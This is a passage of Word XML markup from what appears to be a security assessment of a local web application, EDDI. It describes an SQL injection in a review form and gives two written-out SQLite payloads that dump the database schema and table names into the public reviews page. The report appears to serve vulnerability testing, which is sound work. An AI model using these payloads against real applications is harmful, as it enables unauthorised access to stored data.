          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>In addition, MD5 is vulnerable to collisions, meaning two different passwords could generate the same hash. This could be exploited to access sensitive data by using different passwords that generate the same hash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CD245A" w14:textId="7569C46F" w:rsidR="00910649" w:rsidRDefault="00C172B6" w:rsidP="00C172B6">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="94" w:name="_Toc200039303"/>
      <w:r>
        <w:t>SQL-injections</w:t>
      </w:r>
      <w:bookmarkEnd w:id="94"/>
    </w:p>
    <w:p w14:paraId="1786BB48" w14:textId="32C7D32C" w:rsidR="004626BE" w:rsidRDefault="00CB51F8" w:rsidP="004626BE">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">In EDDI there is a page in which </w:t>
      </w:r>
      <w:r w:rsidR="00FC25FD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">is possible to leave a review to the site, but looking at the code and the static analysis there is </w:t>
      </w:r>
      <w:r w:rsidR="002B1EC9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002B1EC9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002B1EC9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-database connected (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002B1EC9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sqlite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002B1EC9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) without the use of prepare statements, so it’s possible to </w:t>
      </w:r>
      <w:r w:rsidR="00BE6452">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">perform an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00BE6452" w:rsidRPr="00B94FF3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BE6452" w:rsidRPr="00B94FF3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-injection</w:t>
      </w:r>
      <w:r w:rsidR="002B1EC9" w:rsidRPr="00B94FF3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="002B1EC9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEEBC13" w14:textId="40E2E049" w:rsidR="00B94FF3" w:rsidRDefault="00B94FF3" w:rsidP="004626BE">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>To perform this, an attacker can use also the page</w:t>
      </w:r>
      <w:r w:rsidR="00577E84">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in which is published the reviews (</w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidR="00577E84" w:rsidRPr="00825A88">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:i/>
            <w:iCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://localhost:7070/reviews.</w:t>
        </w:r>
        <w:r w:rsidR="00577E84" w:rsidRPr="00577E84">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>html</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00577E84">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r w:rsidRPr="00577E84">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> get something like an</w:t>
      </w:r>
      <w:r w:rsidR="00577E84">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Oracle of output for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00577E84">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00577E84">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-injection (</w:t>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200027793 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="004E7FC7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200027797 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00577E84">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. It was confirmed that there was an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-injection just by adding the char “ ’ ” in the review filed (</w:t>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200027873 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), but this throw a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> error (</w:t>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200027901 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00F75AE3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) that was simple to bypass</w:t>
      </w:r>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> using the comment chars found in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sqlite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> documentation (</w:t>
      </w:r>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200027944 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="007D1165">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602F5E0A" w14:textId="36093DEB" w:rsidR="00C45626" w:rsidRDefault="007D1165" w:rsidP="00C45626">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Given this information an attacker can be able to </w:t>
      </w:r>
      <w:r w:rsidR="0055761A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>perform serious damage</w:t>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="0055761A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="0055761A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>database like insert a lot of dummy values in the table, destroy the database structure or also dump all</w:t>
      </w:r>
      <w:r w:rsidR="00C45626">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the information in the </w:t>
      </w:r>
      <w:r w:rsidR="003A09A6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>database</w:t>
      </w:r>
      <w:r w:rsidR="00C45626">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, below are reported some payload:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EEDF9AD" w14:textId="5AC32723" w:rsidR="00C45626" w:rsidRPr="00C45626" w:rsidRDefault="004626BE" w:rsidP="00C45626">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A09A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Dump the database </w:t>
      </w:r>
      <w:r w:rsidR="00C75E40" w:rsidRPr="003A09A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>structure</w:t>
      </w:r>
      <w:r w:rsidR="003A09A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003A09A6" w:rsidRPr="003A09A6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200027797 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="003A09A6" w:rsidRPr="003A09A6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00C45626">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">test'); INSERT INTO reviews (username, email, review) SELECT name, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, 'schema' FROM </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sqlite_master</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> WHERE type='table'; --</w:t>
      </w:r>
      <w:r w:rsidR="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E33A07" w14:textId="0BC142A9" w:rsidR="004626BE" w:rsidRPr="000A31DA" w:rsidRDefault="009341EB" w:rsidP="004626BE">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A09A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Dump the </w:t>
      </w:r>
      <w:r w:rsidR="00077668" w:rsidRPr="003A09A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>table and columns name of the database</w:t>
      </w:r>
      <w:r w:rsidR="003A09A6" w:rsidRPr="003A09A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003A09A6" w:rsidRPr="003A09A6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200028141 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="005C50D3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="003A09A6" w:rsidRPr="003A09A6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00C45626">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00C45626">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00387971" w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>test'); INSERT INTO reviews (username, email, review) VALUES ('DB_ENUM', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00387971" w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>schema_dump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00387971" w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>', (SELECT GROUP_CONCAT('Table: ' || name || ' | Schema: ' || COALESCE(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00387971" w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00387971" w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, 'N/A'), ' || ') FROM </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00387971" w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sqlite_master</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00387971" w:rsidRPr="00C45626">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> WHERE type='table')); --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035D17BF" w14:textId="77777777" w:rsidR="00387971" w:rsidRDefault="00B141FC" w:rsidP="00387971">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00B141FC">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1A5C0C3C" wp14:editId="19170E11">
            <wp:extent cx="3946035" cy="3233463"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>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954986" cy="3240798"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5968708D" w14:textId="44D4C071" w:rsidR="00C172B6" w:rsidRDefault="00387971" w:rsidP="00387971">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="95" w:name="_Ref200027873"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="95"/>
      <w:r>
        <w:t xml:space="preserve">: Form in which there is a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB51F8">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656F52FB" w14:textId="77777777" w:rsidR="003C1720" w:rsidRDefault="003C1720" w:rsidP="00C172B6">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B114830" w14:textId="77777777" w:rsidR="00387971" w:rsidRDefault="003C1720" w:rsidP="00387971">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="003C1720">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50C4873C" wp14:editId="25526705">
            <wp:extent cx="5733415" cy="233045"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>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3415" cy="233045"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="410B451C" w14:textId="6CBAFB41" w:rsidR="00387971" w:rsidRDefault="00387971" w:rsidP="00387971">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="96" w:name="_Ref200027901"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="96"/>
      <w:r>
        <w:t xml:space="preserve">: Error throw by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0156974C" w14:textId="1893041B" w:rsidR="003C1720" w:rsidRDefault="00B141FC" w:rsidP="00C172B6">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B661D9" w14:textId="77777777" w:rsidR="00387971" w:rsidRDefault="00B26872" w:rsidP="00387971">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00B26872">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1FC002FD" wp14:editId="1F5E2104">
            <wp:extent cx="3980648" cy="3252563"/>
            <wp:effectExtent l="0" t="0" r="1270" b="5080"/>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986266" cy="3257153"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DC4C8D" w14:textId="25E81997" w:rsidR="00B26872" w:rsidRDefault="00387971" w:rsidP="00387971">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="97" w:name="_Ref200027944"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
      <w:r>
